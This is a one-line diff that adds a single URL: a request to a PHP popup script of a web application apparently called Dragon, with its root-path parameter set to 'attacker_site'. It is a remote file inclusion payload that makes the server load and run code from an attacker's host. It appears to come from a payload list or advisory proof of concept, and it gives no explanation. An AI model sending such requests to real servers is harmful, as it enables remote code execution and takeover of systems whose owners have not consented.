@@ -1,0 +1,1 @@
+http://www.example.com/[dragon_path]/public_includes/pub_popup/popup_finduser.php?vsDragonRootPath=attacker_site
